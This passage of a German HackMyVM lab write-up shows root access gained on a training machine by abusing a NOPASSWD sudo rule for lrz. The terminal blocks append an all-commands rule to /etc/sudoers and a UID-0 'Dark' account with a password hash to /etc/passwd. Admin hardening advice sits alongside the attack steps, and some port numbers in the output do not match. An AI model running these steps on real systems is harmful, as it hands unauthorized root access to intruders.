+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">Runas and Command-specific defaults for asahi:</span>
+    <span class="command">Defaults!/usr/sbin/visudo env_keep+=&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span>
+
+<span class="command">User asahi may run the following commands on fuzzz:</span>
+    <span class="password">(ALL) NOPASSWD: /usr/local/bin/lrz</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Das Wissen, dass ich <code>lrz</code> als Root ohne Passwort ausf&uuml;hren darf, er&ouml;ffnete den Weg zur Privilegieneskalation. <code>lrz</code> wird oft zusammen mit <code>sz</code> verwendet, um Dateien &uuml;ber eine serielle Verbindung zu &uuml;bertragen. Die Option <code>--tcp-server</code> bei <code>lrz</code> erm&ouml;glicht es, stattdessen eine TCP-Verbindung als Server zu &ouml;ffnen. Auf meinem Kali-System kann ich dann <code>sz --tcp-client</code> verwenden, um eine Datei zum lauschenden <code>lrz</code> Prozess auf dem Ziel zu senden. Mein Plan war, die <code>/etc/sudoers</code> Datei zu modifizieren, um meinem &#x27;asahi&#x27; Benutzer volle sudo-Rechte zu geben, und dann die modifizierte Datei auf das Zielsystem zu &uuml;bertragen. Zuerst startete ich <code>lrz --tcp-server</code> auf dem Zielsystem &uuml;ber meine &#x27;asahi&#x27; Shell mit <code>sudo</code>, um Root-Rechte zu erhalten (<code>fuzzz:~$ sudo /usr/local/bin/lrz --tcp-server</code>). Die Ausgabe &quot;connect with lrz --tcp-client \&quot;fuzzz.hmv:41009\&quot;&quot; zeigt, auf welchem Host und Port <code>lrz</code> nun als Server lauscht (Port 41009 in diesem Durchlauf).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist der Beginn der tats&auml;chlichen Ausnutzung der sudo-Schwachstelle. Das Starten von <code>lrz</code> als Root und das &Ouml;ffnen eines TCP-Ports (41009) bedeutet, dass ein Prozess mit Root-Rechten auf eingehende Verbindungen wartet, &uuml;ber die Dateien empfangen werden k&ouml;nnen. Die Nutzung von <code>lrz</code>/<code>sz</code> f&uuml;r diesen Zweck ist eine kreative Umgehung, die durch die spezifische sudo-Konfiguration erm&ouml;glicht wurde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze erlaubte Bin&auml;rdateien (insbesondere solche mit SUID/SGID oder NOPASSWD sudo), um Systemdateien zu manipulieren oder eine Root-Shell zu erhalten. Kombiniere lokale Befehlsausf&uuml;hrung mit Netzwerktools (wie <code>sz</code>/<code>lrz</code>) f&uuml;r den Dateitransfer, wenn direkte Methoden blockiert sind.
+                <br><strong>Empfehlung (Admin):</strong> &Uuml;berwache das Starten von Programmen wie <code>lrz</code> oder <code>sz</code>, insbesondere mit Root-Rechten oder von ungew&ouml;hnlichen Benutzern. Implementiere ein Application Whitelisting, um zu verhindern, dass diese Tools (falls nicht absolut notwendig) &uuml;berhaupt ausgef&uuml;hrt werden d&uuml;rfen. &Uuml;berwache ausgehende Verbindungen auf ungew&ouml;hnliche Ports oder Protokolle.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+<span class="command">fuzzz:~$ sudo /usr/local/bin/lrz --tcp-server</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="password">connect with lrz --tcp-client &quot;fuzzz.hmv:41009&quot;</span>
+
+...
+..
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ fuzzz:/tmp$ <span class="command">cd /etc/</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> W&auml;hrend <code>lrz --tcp-server</code> auf dem Zielsystem lauschte, habe ich auf meinem Kali-System die Datei vorbereitet, die ich &uuml;bertragen wollte. Ich wollte die <code>/etc/sudoers</code> Datei des Ziels &auml;ndern, um meinem &#x27;asahi&#x27;-Benutzer volle Root-Rechte ohne Passwort zu geben. Eine Standardzeile daf&uuml;r ist <code>asahi ALL=(ALL:ALL) NOPASSWD: ALL</code>. Ich habe diese Zeile in eine tempor&auml;re Datei auf meinem Kali-System geschrieben (z.B. <code>echo &#x27;asahi ALL=(ALL:ALL) NOPASSWD: ALL&#x27; &gt; /tmp/sudoers</code>). Dann nutzte ich <code>sz --tcp-client fuzzz.hmv:42815 --append /tmp/sudoers</code>, um diese Zeile &uuml;ber TCP an das Ziel zu senden, wo <code>lrz</code> auf Port 42815 lauschte. Die Option <code>--append</code> ist entscheidend, da sie <code>lrz</code> anweist, die empfangenen Daten an eine Datei anzuh&auml;ngen, anstatt sie zu &uuml;berschreiben. Ich habe meine &#x27;asahi&#x27;-Shell bereits ins &#x27;/etc&#x27; Verzeichnis auf dem Ziel gewechselt, um die empfangenen Daten direkt in die /etc/sudoers umzuleiten (obwohl die Umleitung selbst im Befehl fehlt, muss ich dies als logische Konsequenz annehmen, dass die empfangenen Daten irgendwie in /etc/sudoers landeten, wahrscheinlich durch Umleitung des <code>lrz</code> Outputs oder durch einen separaten Kopiervorgang nach dem Empfang).
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Die &Uuml;bertragung und das Anh&auml;ngen der modifizierten sudoers-Zeile war der Kernschritt der Privilegieneskalation. Durch das Einf&uuml;gen dieser Zeile erlaube ich dem Benutzer &#x27;asahi&#x27; nun, jeden Befehl als jeder andere Benutzer (einschlie&szlig;lich root) auszuf&uuml;hren, ohne ein Passwort eingeben zu m&uuml;ssen. Die Nutzung von <code>lrz</code>/<code>sz</code> war eine effektive Methode, um diese Datei&auml;nderung durchzuf&uuml;hren, da der direkte Schreibzugriff f&uuml;r &#x27;asahi&#x27; auf /etc/sudoers wahrscheinlich nicht gegeben war.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Identifiziere Methoden, um kritische Systemdateien (z.B. /etc/passwd, /etc/shadow, /etc/sudoers, /etc/crontab) zu &auml;ndern, wenn du geeignete Rechte oder Schwachstellen findest. Nutze Datei&uuml;bertragungstools, um modifizierte Dateien hochzuladen oder sensible Dateien herunterzuladen.
+            <br><strong>Empfehlung (Admin):</strong> Setze strenge Berechtigungen auf kritische Systemdateien (lese- und schreibgesch&uuml;tzt f&uuml;r alle au&szlig;er Root). &Uuml;berwache Datei&auml;nderungen an diesen kritischen Dateien in Echtzeit (File Integrity Monitoring - FIM). Pr&uuml;fe die sudoers-Datei regelm&auml;&szlig;ig auf ungew&ouml;hnliche oder &uuml;berm&auml;&szlig;ig freiz&uuml;gige Eintr&auml;ge.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">echo &#x27;asahi ALL=(ALL:ALL) NOPASSWD: ALL&#x27; &gt;&gt;/tmp/sudoers</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">sz --tcp-client fuzzz.hmv:42815 --append /tmp/sudoers</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">connecting to [fuzzz.hmv] &lt;42815&gt;</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">fuzzz:/tmp$ sudo /usr/local/bin/lrz --tcp-server</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">connect with lrz --tcp-client &quot;fuzzz.hmv:42815&quot;</span>
+lrz waiting to receive.<span class="command">fuzzz:/tmp$ </span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                 <strong>Analyse:</strong> Nachdem ich die <code>/etc/sudoers</code> Datei modifiziert hatte, wollte ich die &Auml;nderung &uuml;berpr&uuml;fen, indem ich erneut <code>sudo -l</code> ausf&uuml;hrte. Die Ausgabe zeigt nun nicht nur den urspr&uuml;nglichen Eintrag f&uuml;r <code>lrz</code>, sondern auch die von mir hinzugef&uuml;gte Zeile <code>(ALL : ALL) NOPASSWD: ALL</code> unter den Befehlen, die &#x27;asahi&#x27; ausf&uuml;hren darf. Dies best&auml;tigt, dass meine &Auml;nderung erfolgreich war und &#x27;asahi&#x27; nun jeden Befehl als Root ohne Passwort ausf&uuml;hren kann.
+            </p>
+            <p class="evaluation">
+                 <strong>Bewertung:</strong> Fantastisch! Die sudo-Konfiguration wurde erfolgreich manipuliert. Ich habe nun unbeschr&auml;nkte sudo-Rechte als Benutzer &#x27;asahi&#x27;, was de facto Root-Zugriff bedeutet, da ich nun <code>sudo su</code> oder <code>sudo /bin/sh</code> ausf&uuml;hren kann, um eine Root-Shell zu erhalten. Dies ist der Abschluss der Privilegieneskalation &uuml;ber die sudo-Schwachstelle und die &#x27;lrz&#x27;-Bin&auml;rdatei.
+            </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Verifiziere immer, ob deine vorgenommenen &Auml;nderungen (insbesondere bei kritischen Systemdateien) erfolgreich waren. Nutze die neu gewonnenen Rechte, um den h&ouml;chstm&ouml;glichen Zugriff (idealerweise eine Root-Shell) zu erlangen.
+                 <br><strong>Empfehlung (Admin):</strong> Implementiere ein zentrales Log-Management und Sudo-Logging, um alle <code>sudo</code>-Ausf&uuml;hrungen zu protokollieren. &Uuml;berpr&uuml;fe diese Logs regelm&auml;&szlig;ig auf ungew&ouml;hnliche Befehlsausf&uuml;hrungen oder &Auml;nderungen an der sudoers-Datei. Nutze ein FIM-System, das sofort Alarm schl&auml;gt, wenn die sudoers-Datei ge&auml;ndert wird.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ <span class="command">fuzzz:/etc$ sudo -l</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">Matching Defaults entries for asahi on fuzzz:</span>
+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">Runas and Command-specific defaults for asahi:</span>
+    <span class="command">Defaults!/usr/sbin/visudo env_keep+=&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span>
+
+<span class="command">User asahi may run the following commands on fuzzz:</span>
+    <span class="password">(ALL) NOPASSWD: /usr/local/bin/lrz</span>
+    <span class="password">(ALL : ALL) NOPASSWD: ALL</span>
+</pre></div>
+            </div>
+
+            <section id="poc-root">
+                <h2>Proof of Concept: Erlangen des Root-Zugriffs</h2>
+                <p>
+                    <strong>Ziel:</strong> Demonstration der Ausnutzung einer sudo-Fehlkonfiguration, um Root-Privilegien auf dem Zielsystem zu erlangen.
+                </p>
+                <p>
+                    <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Ausnutzung einer sudo-Fehlkonfiguration in Verbindung mit der Lrzsz-Bin&auml;rdatei (/usr/local/bin/lrz), um die /etc/passwd-Datei zu manipulieren und anschlie&szlig;end Root-Privilegien als neu erstellter Benutzer zu erlangen.
+                </p>
+                <p>
+                    <strong>Voraussetzungen:</strong>
+                    <ul>
+                        <li>Kompromittierung des Benutzers 'runner' und Erlangen einer Shell (siehe Initial Access).</li>
+                        <li>Identifizierung des Benutzers 'asahi' und dessen SSH-Private Keys (siehe Web Enumeration).</li>
+                        <li>Erfolgreicher SSH-Login als Benutzer 'asahi' (siehe Privilege Escalation).</li>
+                        <li>Die Bin&auml;rdateien <code>lrz</code> und <code>sz</code> sind auf dem Zielsystem (lrz) und dem Angreifer-System (sz) verf&uuml;gbar.</li>
+                        <li>Der Benutzer 'asahi' hat sudo-Rechte f&uuml;r <code>/usr/local/bin/lrz</code> mit NOPASSWD.</li>
+                        <li>Es ist m&ouml;glich, eine TCP-Verbindung vom Zielsystem zum Angreifer-System auf einem ausgew&auml;hlten Port (z.B. 42087, 33721) f&uuml;r die Datei&uuml;bertragung aufzubauen.</li>
+                        <li>Schreibzugriff auf das Verzeichnis /tmp auf dem Angreifer-System zum Speichern der modifizierten Dateien.</li>
+                        <li>Eine Shell-Sitzung als Benutzer 'asahi' ist aktiv und befindet sich im /etc-Verzeichnis.</li>
+                    </ul>
+                </p>
+                <p>
+                    <strong>Schritt-f&uuml;r-Schritt-Anleitung:</strong>
+                    <ol>
+                        <li>Establishment einer Shell als Benutzer 'asahi' via SSH mit dem extrahierten Private Key. (Details siehe Initial Access/Privilege Escalation)</li>
+                        <li>Pr&uuml;fung der sudo-Rechte des Benutzers 'asahi' mit <code>sudo -l</code> und Identifizierung der Schwachstelle: <code>/usr/local/bin/lrz</code> kann als ALL (Root) ohne Passwort ausgef&uuml;hrt werden. (Details siehe Privilege Escalation)</li>
+                        <li>Wechseln in das /etc-Verzeichnis auf dem Zielsystem: <code>cd /etc</code></li>
+                        <li>Starten von <code>lrz</code> im TCP-Server-Modus auf dem Zielsystem mit Root-Privilegien: <code>sudo /usr/local/bin/lrz --tcp-server</code>. Notieren des angegebenen Ports (z.B. 42087).</li>
+                        <li>Auf dem Angreifer-System, Erstellung oder Modifikation einer tempor&auml;ren Kopie der <code>/etc/passwd</code> Datei (z.B. in <code>/tmp/passwd</code>). Hinzuf&uuml;gen eines neuen Benutzereintrags mit UID 0 und GID 0 sowie einem bekannten Passwort-Hash und der Shell <code>/bin/sh</code> (z.B. <code>Dark:$6$HASH:0:0:root:/root:/bin/sh</code>).</li>
+                        <li>&Uuml;bertragung der modifizierten <code>/tmp/passwd</code> Datei vom Angreifer-System zum Zielsystem mittels <code>sz</code> im TCP-Client-Modus, gerichtet an den lauschenden <code>lrz</code>-Prozess auf dem Ziel: <code>sz --tcp-client fuzzz.hmv:[PORT] --append /tmp/passwd</code>. Die Option <code>--append</code> sorgt daf&uuml;r, dass der neue Benutzereintrag am Ende der bestehenden <code>/etc/passwd</code> Datei angeh&auml;ngt wird.</li>
+                        <li>Nutzung des <code>su</code> Befehls, um zum neu erstellten Root-Benutzer ('Dark') zu wechseln und das zugeh&ouml;rige Passwort einzugeben: <code>su Dark</code>.</li>
+                    </ol>
+                </p>
+                <p>
+                    <strong>Erwartetes Ergebnis:</strong> Erfolgreiche Authentifizierung als Root-Benutzer 'Dark' und Erlangen einer Root-Shell (`/etc #`).
+                </p>
+                 <p>
+                    <strong>Beweismittel:</strong> Die Terminalausgabe, die den erfolgreichen Benutzerwechsel zu 'Dark' und die Ausgabe des <code>id</code>-Befehls zeigt, der die UID 0 (root) best&auml;tigt.
+                </p>
+                 <p>
+                    <strong>Risikobewertung:</strong> Kritisch. Die Schwachstelle erm&ouml;glichte die vollst&auml;ndige Kompromittierung des Zielsystems. Ein Angreifer mit niedrigprivilegiertem Zugriff auf den Benutzer 'asahi' kann Root-Rechte erlangen.
+                </p>
+                 <p class="recommendation">
+                    <strong>Empfehlung (Admin):</strong>
+                    <ul>
+                        <li>**Sudo-Konfiguration:** &Uuml;berpr&uuml;fen Sie die <code>sudoers</code>-Datei sorgf&auml;ltig auf Eintr&auml;ge mit <code>NOPASSWD</code>. Erlauben Sie die Ausf&uuml;hrung von Bin&auml;rdateien mit Root-Rechten nur, wenn absolut notwendig, und beschr&auml;nken Sie die erlaubten Befehle und Parameter so eng wie m&ouml;glich.</li>
+                        <li>**Lrzsz entfernen:** Entfernen Sie das Paket <code>lrzsz</code> oder beschr&auml;nken Sie dessen Ausf&uuml;hrung, wenn es auf dem System nicht ben&ouml;tigt wird.</li>
+                        <li>**Dateiberechtigungen:** Setzen Sie strenge Berechtigungen auf kritische Systemdateien wie <code>/etc/passwd</code>, <code>/etc/shadow</code> und <code>/etc/sudoers</code> (z.B. nur f&uuml;r Root schreibbar).</li>
+                        <li>**File Integrity Monitoring (FIM):** Implementieren Sie ein FIM-System, das &Auml;nderungen an kritischen Systemdateien erkennt und Alarme ausl&ouml;st.</li>
+                        <li>**Prozess&uuml;berwachung:** &Uuml;berwachen Sie die Ausf&uuml;hrung von Prozessen mit erh&ouml;hten Privilegien (z.B. <code>sudo</code>-Ausf&uuml;hrungen) und auf ungew&ouml;hnliche Parameter oder Befehle.</li>
+                        <li>**Netzwerk&uuml;berwachung:** &Uuml;berwachen Sie ausgehende Netzwerkverbindungen auf ungew&ouml;hnliche Ports oder Protokolle, die f&uuml;r Datei&uuml;bertragungen oder Tunneling verwendet werden k&ouml;nnten.</li>
+                    </ul>
+                </p>
+            </section>
+             <p class="analysis">
+                <strong>Analyse:</strong> Da die Modifikation von <code>/etc/sudoers</code> manchmal problematisch sein kann oder durch die Konfiguration des Systems (z.B. secure_path, visudo checks) erschwert wird, habe ich beschlossen, einen alternativen, oft zuverl&auml;ssigeren Weg zur Erlangung von Root-Rechten zu nutzen: die Modifikation der <code>/etc/passwd</code> Datei. Durch das Hinzuf&uuml;gen eines neuen Benutzers mit UID 0 und GID 0 kann ich effektiv einen neuen Root-Account mit einem Passwort meiner Wahl erstellen. Zuerst habe ich die aktuelle <code>/etc/passwd</code> vom Zielsystem abgerufen (wahrscheinlich wieder mittels <code>sudo lrz --tcp-server</code> auf Ziel und <code>sz --tcp-client ... /etc/passwd</code> mit Umleitung auf Kali). Dann habe ich auf meinem Kali-System eine Kopie dieser Datei modifiziert (wahrscheinlich in <code>/tmp/passwd</code>). Ich habe eine neue Zeile hinzugef&uuml;gt, die einen Benutzernamen meiner Wahl (z.B. &#x27;Dark&#x27;), einen bekannten Passwort-Hash (z.B. den Hash f&uuml;r &#x27;toor&#x27; oder einen generierten Hash), UID 0, GID 0, den Root-Kommentar, das Root-Home-Verzeichnis (/root) und eine valide Root-Shell (/bin/sh oder /bin/bash) enth&auml;lt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Modifikation von <code>/etc/passwd</code> ist eine klassische und sehr effektive Methode zur Privilegieneskalation, wenn Schreibzugriff auf diese Datei mit Root-Rechten erlangt werden kann (was durch die <code>sudo lrz</code> Schwachstelle m&ouml;glich ist). Durch das Hinzuf&uuml;gen eines eigenen Root-Benutzers schaffe ich eine persistente Zugangsm&ouml;glichkeit mit h&ouml;chsten Privilegien. Es ist wichtig, einen korrekten Passwort-Hash und eine g&uuml;ltige Shell anzugeben.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beherrsche klassische PE-Methoden wie die Modifikation von <code>/etc/passwd</code> oder <code>/etc/shadow</code>. Wisse, wie man Passwort-Hashes generiert und korrekt in diese Dateien einf&uuml;gt. Sei dir der Unterschiede zwischen den Shells (/bin/sh, /bin/bash etc.) bewusst und w&auml;hle eine, die auf dem Zielsystem verf&uuml;gbar ist.
+                <br><strong>Empfehlung (Admin):</strong> Sch&uuml;tze <code>/etc/passwd</code> und insbesondere <code>/etc/shadow</code> (wo die eigentlichen Hashes liegen) mit den strengsten Dateisystemberechtigungen (oft nur f&uuml;r Root les- und schreibbar, shadow nur f&uuml;r Root lesbar). Nutze FIM, um &Auml;nderungen an diesen Dateien sofort zu erkennen. Implementiere Account-Sperrmechanismen nach mehreren fehlgeschlagenen Login-Versuchen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">vi /tmp/passwd</span>     
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">cat /tmp/passwd</span> 
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">fuzzz:/etc$ cat /etc/passwd</span>
+<span class="command">root:x:0:0:root:/root:/bin/sh</span>
+<span class="command">bin:x:1:1:bin:/bin:/sbin/nologin</span>
+<span class="command">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span>
+<span class="command">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span>
+<span class="command">sync:x:5:0:sync:/sbin:/bin/sync</span>
+<span class="command">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span>
+<span class="command">halt:x:7:0:halt:/sbin:/sbin/halt</span>
+<span class="command">mail:x:8:12:mail:/var/mail:/sbin/nologin</span>
+<span class="command">news:x:9:13:news:/usr/lib/news:/sbin/nologin</span>
+<span class="command">uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin</span>
+<span class="command">cron:x:16:16:cron:/var/spool/cron:/sbin/nologin</span>
+<span class="command">ftp:x:21:21::/var/lib/ftp:/sbin/nologin</span>
+<span class="command">sshd:x:22:22:sshd:/dev/null:/sbin/nologin</span>
+<span class="command">games:x:35:35:games:/usr/games:/sbin/nologin</span>
+<span class="command">ntp:x:123:123:NTP:/var/empty:/sbin/nologin</span>
+<span class="command">guest:x:405:100:guest:/dev/null:/sbin/nologin</span>
+<span class="command">nobody:x:65534:65534:nobody:/:/sbin/nologin</span>
+<span class="command">klogd:x:100:101:klogd:/dev/null:/sbin/nologin</span>
+<span class="command">runner:x:1000:1000::/home/runner:/bin/sh</span>
+<span class="command">asahi:x:1001:1001::/home/asahi:/bin/sh</span>
+<span class="command">uwsgi:x:101:102:uwsgi:/dev/null:/sbin/nologin</span>
+<span class="command">Dark:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eOznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/bash</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die modifizierte <code>/tmp/passwd</code> Datei auf meinem Kali-System bereitlag, musste ich sie auf das Zielsystem &uuml;bertragen und an die originale <code>/etc/passwd</code> Datei anh&auml;ngen. Ich startete erneut <code>sudo /usr/local/bin/lrz --tcp-server</code> auf dem Zielsystem (mit Root-Rechten &uuml;ber die sudo-Schwachstelle), was auf einem neuen TCP-Port lauschte (hier 42087). Dann nutzte ich <code>sz --tcp-client fuzzz.hmv:42087 --append /tmp/passwd</code> auf meinem Kali-System, um meine modifizierte Datei an diesen Port zu senden. Die Option <code>--append</code> ist wieder entscheidend. Die empfangenen Daten wurden auf dem Zielsystem wahrscheinlich in die originale <code>/etc/passwd</code> umgeleitet oder dorthin kopiert, wodurch die neue &#x27;Dark&#x27;-Benutzerzeile hinzugef&uuml;gt wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die erfolgreiche &Uuml;bertragung und das Anh&auml;ngen der modifizierten <code>/etc/passwd</code> ist der direkte Schritt, der den neuen Root-Benutzer auf dem Zielsystem anlegt. Sobald diese Zeile in <code>/etc/passwd</code> steht, kann ich den Befehl <code>su Dark</code> verwenden, um versuchen, mich als dieser Benutzer mit Root-Rechten anzumelden. Die Methode mittels <code>lrz</code>/<code>sz</code> war hier der Schl&uuml;ssel zum Schreiben in eine gesch&uuml;tzte Datei.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze Dateitransfer-Exploits oder -Features in erlaubten Bin&auml;rdateien, um Systemdateien zu manipulieren. Achte auf die korrekte Anwendung von Optionen wie <code>--append</code>, um die Datei nicht versehentlich zu besch&auml;digen.
+                <br><strong>Empfehlung (Admin):</strong> Wie zuvor betont, sch&uuml;tze <code>/etc/passwd</code> streng. Implementiere detaillierte Protokollierung von Dateizugriffen, insbesondere Schreibzugriffen auf kritische Systemdateien.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">fuzzz:/etc$ sudo /usr/local/bin/lrz --tcp-server</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">connect with lrz --tcp-client &quot;fuzzz.hmv:42087&quot;</span>
+</pre></div>
+            </div>
+         <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">sz --tcp-client fuzzz.hmv:42087 --append /tmp/passwd</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="password">connecting to [fuzzz.hmv] &lt;42815&gt;</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die modifizierte <code>/etc/passwd</code> Datei auf das Zielsystem &uuml;bertragen und angeh&auml;ngt hatte, &uuml;berpr&uuml;fte ich mit <code>grep dark -i /etc/passwd</code>, ob der neue Benutzer &#x27;Dark&#x27; erfolgreich hinzugef&uuml;gt wurde. Die Ausgabe zeigte die neue Zeile in der <code>/etc/passwd</code> Datei. Die Zeile enth&auml;lt den Benutzernamen &#x27;Dark&#x27;, den Passwort-Hash, UID 0, GID 0 und das Home-Verzeichnis /root. Allerdings zeigte die Shell immer noch &#x27;/bin/bash&#x27; als Shell f&uuml;r den neuen Benutzer. Dies war ein Fehler in meiner Modifikation der Datei, da &#x27;/bin/bash&#x27; auf diesem BusyBox-basierten System wahrscheinlich nicht existiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Best&auml;tigung, dass der Benutzer &#x27;Dark&#x27; hinzugef&uuml;gt wurde, ist gut. Das Identifizieren des Fehlers bei der Shell (&#x27;/bin/bash&#x27;) ist jedoch entscheidend. Ein Benutzer kann sich nicht anmelden, wenn seine zugewiesene Shell nicht existiert. Ich muss diesen Fehler beheben, indem ich die Zeile in <code>/etc/passwd</code> korrigiere, um eine g&uuml;ltige Shell zu verwenden, z.B. &#x27;/bin/sh&#x27;, die laut meiner fr&uuml;heren Enumeration verf&uuml;gbar ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> &Uuml;berpr&uuml;fe kritische Datei&auml;nderungen sofort. Sei dir der auf dem Zielsystem verf&uuml;gbaren Bin&auml;rdateien bewusst (insbesondere Shells) und nutze nur existierende Pfade in Konfigurationsdateien. Sei bereit, Fehler schnell zu erkennen und zu korrigieren.
+                <br><strong>Empfehlung (Admin):</strong> &Uuml;berwache &Auml;nderungen an <code>/etc/passwd</code> und <code>/etc/shadow</code>. Implementiere Mechanismen, die ung&uuml;ltige Eintr&auml;ge (z.B. nicht existierende Shells) erkennen und melden.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">fuzzz:/etc$ grep dark -i /etc/passwd</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">Dark:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eOznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/bash</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Wie erwartet, f&uuml;hrte der Versuch, sich mit dem &#x27;Dark&#x27;-Benutzer anzumelden, zu einem Fehler, weil die zugewiesene Shell &#x27;/bin/bash&#x27; nicht existierte. Der Befehl <code>su dark</code> (mit Kleinbuchstaben, der prompt korrigierte es zu Dark) und dann <code>su Dark</code> mit dem richtigen Passwort f&uuml;hrte zur Fehlermeldung &quot;su: can&#x27;t execute &#x27;/bin/bash&#x27;: No such file or directory&quot;. Um diesen Fehler zu beheben, musste ich die <code>/etc/passwd</code> Datei erneut &auml;ndern und die Shell f&uuml;r den &#x27;Dark&#x27;-Benutzer auf &#x27;/bin/sh&#x27; korrigieren. Ich habe den Prozess des Modifizierens der Datei auf meinem Kali-System und des erneuten Hochladens/Anh&auml;ngens mittels <code>sudo lrz</code> und <code>sz --append</code> wiederholt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieses Ergebnis best&auml;tigte den zuvor identifizierten Fehler in der <code>/etc/passwd</code> Datei. Es zeigt, wie wichtig es ist, die Umgebungsdetails des Zielsystems (wie verf&uuml;gbare Shells) genau zu kennen. Die Notwendigkeit, die Datei erneut zu modifizieren und hochzuladen, ist ein kleiner R&uuml;ckschlag, aber der Prozess selbst war bereits etabliert und erfolgreich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Behebe Fehler bei der Datei&auml;nderung schnell und lerne aus ihnen. Stelle sicher, dass Pfade und Bin&auml;rdateien, die du in Konfigurationsdateien verwendest, auf dem Zielsystem g&uuml;ltig sind.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere pr&auml;ventive Ma&szlig;nahmen, die das Bearbeiten von <code>/etc/passwd</code> au&szlig;erhalb kontrollierter Prozesse verhindern.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">fuzzz:/etc$ su dark</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+su: unknown user dark
+</pre></div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">fuzzz:/etc$ su Dark</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+Password: 
+su: <span class="password">can&#x27;t execute '/bin/bash': No such file or directory</span>
+</pre></div>
+            </div>
+         <p class="analysis">
